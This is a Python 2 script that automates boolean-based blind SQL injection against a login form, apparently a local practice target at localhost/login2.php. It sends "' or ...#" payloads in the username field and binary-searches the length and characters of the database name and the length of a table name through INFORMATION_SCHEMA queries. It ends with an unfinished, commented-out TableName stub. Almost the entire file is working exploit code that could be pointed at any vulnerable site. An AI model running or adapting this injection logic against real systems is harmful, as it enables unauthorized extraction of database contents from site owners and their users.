#!
import urllib
import urllib2

charList = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
            'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',]






# url
url = 'http://localhost/login2.php'

leftChar = "' or "
rightChar = "#"

# post it,change username:str
def Post(string,left = "' or ",right = "#"):
    print "TESTING: "+leftChar+string+rightChar
    values = {'username':leftChar+string+rightChar,'password':'admin'}
    data = urllib.urlencode(values) # decode
    req = urllib2.Request(url, data)  # send
    response = urllib2.urlopen(req)  #res
    the_page = response.read()  #read
    if (the_page == 'TRUE'):
        return 1
    else:
        return 0

#return funtion
def Judge(string,leftChar = "' or ",rightChar = "#"):
    if (Post(string,leftChar,rightChar) == 1):
        print 1
    else:
        print 0






def DatabaseLength():
    stringDatabase = "length(database())"
    databaseLength = BinarySearchInt(stringDatabase, 0, 16)
    return databaseLength

def BinarySearchInt(stringText, left, right):    #0~16
    currentNum = (left + right) / 2

    if (IsThisInt(stringText, '=', currentNum) == 1):          # length(database())=9
        return currentNum
    elif (IsThisInt(stringText, '<', currentNum) == 1):
        return BinarySearchInt(stringText, left, currentNum)
    elif (IsThisInt(stringText, '>', currentNum) == 1):
        return BinarySearchInt(stringText, currentNum + 1, right)

def BinarySearchNum(stringText, left, right):    #0~16
    currentNum = (left + right) / 2

    if (IsThisNum(stringText, '=', currentNum) == 1):          # length(database())=9
        return currentNum
    elif (IsThisNum(stringText, '<', currentNum) == 1):
        return BinarySearchNum(stringText, left, currentNum)
    elif (IsThisNum(stringText, '>', currentNum) == 1):
        return BinarySearchNum(stringText, currentNum + 1, right)



def DatabaseName():
    length = DatabaseLength()
    dataBaseName = ""
    for i in xrange(1, length + 1, 1):
        stringDatabaseText = "mid(database(),"+str(i)+",1)"
        dataBaseName = dataBaseName + BinarySearchChar(stringDatabaseText,charList)
        print "dataBaseName is:"+dataBaseName
    return dataBaseName

def IsThisChar(stringText, sign, char):
    return Post(stringText+sign+"'"+char+"'");


def IsThisInt(stringText, sign, num):
    return Post(stringText+sign+"'"+str(num)+"'");

def IsThisNum(stringText, sign, num):
    return Post(stringText+sign+str(num)+")");
def BinarySearchChar(stringText,charListA):
    currentIndexNum = len(charListA) / 2
    currentChar = charListA[currentIndexNum]
    leftCharList = charListA[0:currentIndexNum]
    rightCharList = charListA[currentIndexNum + 1:]

    if (IsThisChar(stringText, '=',currentChar) == 1):
        return currentChar
    elif (IsThisChar(stringText, '<',currentChar) == 1):
        return BinarySearchChar(stringText, leftCharList)
    elif (IsThisChar(stringText, '>',currentChar) == 1):
        return BinarySearchChar(stringText, rightCharList)



def TableLength():
    #DatabaseName()
    stringText = "(select length((select table_name from INFORMATION_SCHEMA.columns where table_schema=\""+ DatabaseName()+"\" limit 1 offset 0))"
    tablelength = BinarySearchNum(stringText, 0, 16)
    #Judge(string,left,right)
    print tablelength
    return tablelength
#string = "mid((select table_name from INFORMATION_SCHEMA.columns where table_schema=\"injection\" limit 1 offset 0),1,1)='u'"
#Judge(string)


#string = "(select length((select table_name from INFORMATION_SCHEMA.columns where table_schema=\"injection\" limit 1 offset 0))>1)";
#Judge(string)
#TableLength()

#def TableName():
    